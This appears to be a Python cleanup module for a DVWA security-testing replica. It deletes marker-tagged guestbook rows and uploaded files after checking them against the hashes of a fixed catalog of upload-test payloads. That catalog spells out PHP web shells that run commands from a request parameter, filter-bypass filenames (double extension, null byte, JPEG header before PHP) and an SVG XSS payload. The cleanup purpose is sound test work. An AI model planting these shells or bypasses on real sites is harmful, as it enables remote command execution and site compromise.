"""Remove only uniquely marked DVWA catalog rows and known upload bytes."""

from __future__ import annotations

import hashlib
import json
import subprocess

UPLOAD_PAYLOADS = {
    "shell.php": b'<?php echo "UPLOAD_SUCCESS"; echo system($_GET["cmd"]); ?>\n',
    "shell.php.jpg": b'<?php echo "DOUBLE_EXT_SUCCESS"; echo system($_GET["cmd"]); ?>\n',
    "mime.php": b'<?php echo "MIME_SPOOF_SUCCESS"; echo system($_GET["cmd"]); ?>\n',
    "null.php%00.jpg": b'<?php echo "NULL_BYTE_SUCCESS"; echo system($_GET["cmd"]); ?>\n',
    "avatar.jpg": b'\xff\xd8\xff\xe0<?php passthru($_GET["cmd"]); ?>\n',
    "double.php.jpg": b'<?php echo "pwned"; ?>\n',
    "webshell.php": b'<?php echo "test"; ?>\n',
    "bigfile.bin": b"A" * (1024 * 1024),
    "image.svg": b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')">\n  <text x="0" y="20">SVG XSS</text>\n</svg>\n',
    "page.html": b"<html><body><h1>Test</h1></body></html>\n",
    "traversal.php": b"<?php phpinfo(); ?>\n",
    "webnull.php%00.jpg": b"<?php phpinfo(); ?>\n",
}
PHP_HELPER = r"""
$v=json_decode(stream_get_contents(STDIN),true,512,JSON_THROW_ON_ERROR);
require '/var/www/html/config/config.inc.php';
$c=new mysqli($_DVWA['db_server'],$_DVWA['db_user'],$_DVWA['db_password'],$_DVWA['db_database'],$_DVWA['db_port']);
$c->set_charset('utf8mb4');$c->begin_transaction();
$marker=$v['marker'];$pattern=$marker.'%';
$s=$c->prepare('SELECT comment_id,name,comment FROM guestbook WHERE comment LIKE ? ORDER BY comment_id FOR UPDATE');
$s->bind_param('s',$pattern);$s->execute();$rows=$s->get_result()->fetch_all(MYSQLI_ASSOC);
$root='/var/www/html/hackable/uploads';
if(is_link($root)||realpath($root)!==$root)throw new Exception('unsafe upload root');
$files=[];
foreach(scandir($root) as $name){
 if(!str_starts_with($name,$marker.'-'))continue;
 $path=$root.'/'.$name;
 if(is_link($path)||!is_file($path))throw new Exception('unsafe owned upload');
 $files[$name]=hash_file('sha256',$path);
}
ksort($files);
if($v['action']==='restore'){
 foreach($files as $name=>$hash){
  if(!isset($v['uploads'][$name])||$v['uploads'][$name]!==$hash)throw new Exception('unowned or changed upload');
 }
 foreach($rows as $row){if(!str_starts_with($row['comment'],$marker))throw new Exception('unowned guestbook row');}
 foreach($rows as $row){
  $d=$c->prepare('DELETE FROM guestbook WHERE comment_id=? AND name <=> ? AND comment <=> ?');
  $d->bind_param('iss',$row['comment_id'],$row['name'],$row['comment']);$d->execute();
  if($d->affected_rows!==1)throw new Exception('guestbook row changed');
 }
 foreach($files as $name=>$hash){
  $path=$root.'/'.$name;
  if(is_link($path)||hash_file('sha256',$path)!==$hash)throw new Exception('upload changed during recovery');
  if(!unlink($path))throw new Exception('upload removal failed');
 }
 $files=[];$rows=[];
}
$c->commit();echo json_encode(['uploads'=>(object)$files,'guestbook'=>$rows],JSON_THROW_ON_ERROR);
"""


def expected_uploads(marker: str) -> dict[str, str]:
    """Bind each allowed synthetic filename to its preserved payload hash."""
    return {
        marker + "-" + name: hashlib.sha256(content).hexdigest()
        for name, content in UPLOAD_PAYLOADS.items()
    }


def validate_inventory(inventory: dict, marker: str) -> None:
    """Reject foreign filenames, changed bytes, and rows outside the run marker."""
    expected = expected_uploads(marker)
    for name, digest in inventory["uploads"].items():
        if name not in expected:
            message = "unowned catalog upload"
            raise ValueError(message)
        if expected[name] != digest:
            message = "catalog upload content changed"
            raise ValueError(message)
    if any(not row["comment"].startswith(marker) for row in inventory["guestbook"]):
        message = "unowned catalog guestbook row"
        raise ValueError(message)


def dvwa_database(container: str, action: str, marker: str) -> dict:
    """Verify Compose ownership and execute only fixed PHP journal operations."""
    data = json.loads(
        subprocess.check_output(  # noqa: S603 - declared Docker inventory
            ["/usr/bin/docker", "inspect", container], text=True, timeout=10
        )
    )[0]
    labels = data.get("Config", {}).get("Labels", {})
    if (
        labels.get("com.docker.compose.project") != "origin-server"
        or labels.get("com.docker.compose.service") != container
        or labels.get("com.docker.compose.project.config_files")
        != "/opt/origin-server/docker-compose.yml"
    ):
        message = "DVWA replica ownership mismatch"
        raise ValueError(message)
    result = subprocess.run(  # noqa: S603 - fixed PHP helper and structured input
        ["/usr/bin/docker", "exec", "-i", container, "php", "-r", PHP_HELPER],
        input=json.dumps(
            {"marker": marker, "action": action, "uploads": expected_uploads(marker)}
        ),
        text=True,
        capture_output=True,
        check=True,
        timeout=30,
    )
    inventory = json.loads(result.stdout)
    validate_inventory(inventory, marker)
    if action == "snapshot" and inventory != {"uploads": {}, "guestbook": []}:
        message = "DVWA marker already has persistent data"
        raise ValueError(message)
    return inventory
